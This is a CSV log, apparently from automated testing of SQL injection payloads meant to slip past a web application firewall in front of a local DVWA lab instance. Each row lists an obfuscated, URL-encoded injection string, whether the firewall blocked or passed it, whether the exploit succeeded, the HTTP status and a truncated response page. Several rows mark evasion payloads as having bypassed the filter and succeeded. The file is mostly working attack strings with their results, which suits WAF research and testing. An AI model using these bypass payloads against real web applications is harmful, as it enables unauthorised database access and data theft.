Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27<@!=1%0bor+not+{`if`%0b1}=1=%0b(not%0b{x+(select+1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0333,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor%0b!+{a%0b1}=1=+(!%0b1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0283,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor%0bnot+1=%0b(!~false)+or%27,Bypassed,No,None,Invalid,0.0239,72.53,No,500,
0'<@=.1+||+not%7efalse=%0b(!~false)+||',Bypassed,No,None,Invalid,0.0338,72.53,No,500,
0'<@=.1+or+not+{`if`+1}=1=+(!+true)%0b||%27,Bypassed,No,None,Invalid,0.0179,72.53,No,500,
0'<@!=.1+||+not%0b{x+(select%0b1)}=1=%0b(not+{a+1}=1)%0b||',Bypassed,No,None,Invalid,0.027,72.53,No,500,
0%27<@=1%0b||+not%0b{x%0b(select+1)}=1=%0b(!~false)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0256,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+||+!+{`if`+1}=1=+(not%0b{x%0b(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0158,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not%0b{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)--%0b,Bypassed,No,None,Invalid,0.0113,72.53,No,500,
0%27<@!=.1%0bor+!%7e0=+(!+{x+(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0396,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+(not~0)+||',Bypassed,No,None,Invalid,0.0207,72.53,No,500,
0%27<@!=.1%0bor%0bnot+{a+1}=1=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0393,72.53,No,500,
0%27<@=.1+or+!+{`if`+1}=1=%0b(false)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0373,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0bor+not%0b{x+(select+1)}=1=%0b(not+{x%0b(select+1)}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0581,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor%0bnot+{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)+or%27,Bypassed,No,None,Invalid,0.0243,72.53,No,500,
0'<@!=1.%0b||+!%0b{x+(select+1)}=1=+(not+{`if`+1}=1)+or',Bypassed,No,None,Invalid,0.0531,72.53,No,500,
0%27<@!=1.%0b||%0b!%7efalse=%0b(not+{a%0b1}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0298,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0b{x%0b(select+1)}=1+like+{`if`+1}=1+or',Bypassed,No,None,Invalid,0.032,72.53,No,500,
0%27<@=1.+or+not%0b{a%0b1}=1=%0b(not+{a%0b1}=1)+||',Bypassed,No,None,Invalid,0.0442,72.53,No,500,
0'<@=1.+or%0bnot+true=%0b(false)+or%27,Bypassed,No,None,Invalid,0.0342,72.53,No,500,
0'<@=1%0b||+not%0b{a+1}=1=%0b(not%7e0)+or%27,Bypassed,No,None,Invalid,0.0172,72.53,No,500,
0%27<@!=1+||%0b!+{a%0b1}=1=+(not%7e0)%0bor',Bypassed,No,None,Invalid,0.0267,72.53,No,500,
0'<@!=1+or+!+{a+1}=1=%0b(!+{x%0b(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.0114,72.28,No,500,
0'<@=1+or+!%0b{x+(select+1)}=1=+(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.0238,72.28,No,500,
0'<@=1%0bor%0b!%0b{x%0b(select%0b1)}=1=+(not+{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0151,72.28,No,500,
0'<@!=1.+||%0b!%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select+1)}=1)+or',Blocked,No,None,Invalid,0.026,72.28,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1.+||+!+{x+(select+1)}=1=+(not%0btrue)+or',Blocked,No,None,Invalid,0.0574,72.28,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1%0bor+!%0b{x+(select%0b1)}=1=+(!%0b{a+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0515,72.28,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+not+{a%0b1}=1=+(!+{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0332,72.28,No,500,
0'<@=.1+or+!%0b{x%0b(select+1)}=1=+(not+{a%0b1}=1)+||',Bypassed,No,None,Invalid,0.0352,72.28,No,500,
0'<@=.1%0b||+not+{x+(select+1)}=1=+(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.0522,72.28,No,500,
0'<@!=.1%0bor+{x+(select+1)}=1+like+true%0bor',Bypassed,No,None,Invalid,0.0113,72.53,No,500,
0'<@!=1+or+{x+(select%0b1)}=1%0blike%0b1+or%27,Blocked,No,None,Invalid,0.0305,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor+not%0b{`if`%0b1}=1=%0b(!+true)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0293,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not%0b{x%0b(select+1)}=1=%0b(!~false)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.03,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||+not%0btrue=+(!%0b{x+(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0193,72.53,No,500,
0'<@=.1+or%0bnot+{x%0b(select+1)}=1=+(not+{a+1}=1)+||%27,Bypassed,No,None,Invalid,0.0326,72.53,No,500,
0'<@=1.+||%0b!%7efalse=%0b(not+{x%0b(select%0b1)}=1)+||',Blocked,No,None,Invalid,0.0147,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or+not%0b{`if`+1}=1=%0b(not%0b{a+1}=1)%0b||%27,Bypassed,No,None,Invalid,0.0243,72.53,No,500,
0%27<@=.1+||+not%0b{x%0b(select+1)}=1=%0b(not%0b{a+1}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.033,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not~0=+(!%0b{a+1}=1)%0bor',Bypassed,No,None,Invalid,0.021,72.53,No,500,
0'<@!=.1%0b||+not%0b{x+(select%0b1)}=1=%0b(not%0btrue)%0b||%27,Bypassed,No,None,Invalid,0.061,72.53,No,500,
0'<@!=1%0b||+0=+(not+{a+1}=1)%0bor',Bypassed,No,None,Invalid,0.0458,72.53,No,500,
0'<@=1+or+not%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1)+||%27,Bypassed,No,None,Invalid,0.0527,72.53,No,500,
0%27<@!=1+or%0bnot%0b{x%0b(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0574,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+not%0b{x+(select%0b1)}=1=+(!+{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0421,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0b||+not%0b{x%0b(select+1)}=1=+(not+{`if`%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.0457,72.53,No,500,
0%27||%0b!@<@.+||+{x+(select+1)}=1%0blike+{x+(select%0b1)}=1%0b||%27,Blocked,No,None,Invalid,0.0163,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0bor%0bnot+{x%0b(select%0b1)}=1=+(not%0b1)--%0b,Bypassed,No,None,Invalid,0.0289,72.53,No,500,
0%27<@!=.1+or+!+{x+(select+1)}=1=+(!%0b{x+(select%0b1)}=1)%0b||%27,Blocked,No,None,Invalid,0.0209,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||%0bnot+1=+(not+{x%0b(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0387,72.53,No,500,
0%27<@!=1+or%0bnot%0b{x+(select%0b1)}=1=%0b(not%0b1)%0bor',Blocked,No,None,Invalid,0.0258,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+||+!+{`if`+1}=1=+(!+{x+(select+1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0256,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or+not+{x%0b(select%0b1)}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.0191,72.53,No,500,
0%27<@=1.+or%0bnot+1=%0b(!%7efalse)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0324,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||%0bnot+{`if`+1}=1=%0b(!+{`if`+1}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0291,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27or%0b@<@.+or%0bnot%0b{x%0b(select%0b1)}=1=%0b(not+{x%0b(select+1)}=1)+or,Bypassed,Yes,Yes (unionAtk),Invalid,0.0346,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'or+@<@.+||%0b!%0b{a%0b1}=1=+(not%0b1)+||%27,Bypassed,No,None,Invalid,0.0444,72.53,No,500,
0'<@!=.1+||+!+true=+(!%0b{`if`+1}=1)%0bor',Bypassed,No,None,Invalid,0.0352,72.53,No,500,
0%27<@!=.1+or%0bfalse=+(not+{a+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0398,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or+!~false=+(!+{a+1}=1)%0bor%27,Blocked,No,None,Invalid,0.0191,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1+or+not+{`if`%0b1}=1=+(!+true)+or',Bypassed,No,None,Invalid,0.0155,72.53,No,500,
0%27<@=1+||+not%0b{`if`%0b1}=1=%0b(not+{x+(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0279,72.53,No,500,
0%27<@!=1.+or+not%0b{a%0b1}=1=+(not%0btrue)+or',Bypassed,No,None,Invalid,0.0372,72.53,No,500,
0%27<@!=1%0bor%0b!%0b{a+1}=1=%0b(not%0b{`if`+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0428,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.%0bor+!+{x+(select+1)}=1=+(not%7e0)+or%27,Bypassed,No,None,Invalid,0.0189,72.53,No,500,
0'<@!=1.%0b||+!%0b{`if`%0b1}=1=%0b(not%0b{x+(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0346,72.53,No,500,
0%27<@=1+or+0=%0b(false)+or',Bypassed,No,None,Invalid,0.041,72.53,No,500,
0%27<@=.1%0b||%0bnot%0b{`if`+1}=1=+(!+{`if`%0b1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0222,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or+{x+(select%0b1)}=1+like%0btrue+or%27,Blocked,No,None,Invalid,0.0107,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0bor+!+1=+(!+{a+1}=1)+or',Bypassed,No,None,Invalid,0.014,72.53,No,500,
0%27||%0b@<@%0bor+!+true=+(!%0b{`if`%0b1}=1)+||%27,Blocked,No,None,Invalid,0.0085,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor%0b!%7e0=%0b(not+{x+(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.0307,72.28,No,500,
0%27<@!=.1%0b||%0bnot+{x+(select+1)}=1=%0b(not+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0505,72.28,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+not+{x%0b(select+1)}=1=+(!%0b{a%0b1}=1)%0b||',Bypassed,No,None,Invalid,0.0274,72.28,No,500,
0'<@!=1.%0b||+not+{x+(select%0b1)}=1=+(not%0b{`if`+1}=1)--+,Bypassed,No,None,Invalid,0.0283,72.28,No,500,
0%27<@=.1%0bor%0b!+{x+(select%0b1)}=1=+(!+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0259,72.28,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+not%0b{x+(select+1)}=1=+(not%0b1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0244,72.28,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+or+!+{`if`+1}=1=%0b(!+{x%0b(select%0b1)}=1)+||%27,Bypassed,No,None,Invalid,0.0182,72.28,No,500,
0'<@!=1%0b||+!%0b{x+(select+1)}=1=+(not%0b{`if`+1}=1)%23,Bypassed,No,None,Invalid,0.0278,72.28,No,500,
0'<@!=1+or+not+true=+(not+true)+||%27,Blocked,No,None,Invalid,0.0139,72.53,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor+!+{a%0b1}=1=%0b(not+{a%0b1}=1)+||',Bypassed,No,None,Invalid,0.0345,72.53,No,500,
0%27<@=1.%0bor%0b!+{x+(select+1)}=1=%0b(not+{a+1}=1)+or',Bypassed,No,None,Invalid,0.0248,72.53,No,500,
0%27<@!=.1+||%0bnot+true=%0b(!+{x+(select%0b1)}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0544,72.53,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+!+{`if`+1}=1=%0b(0)%23,Bypassed,No,None,Invalid,0.0445,72.53,No,500,
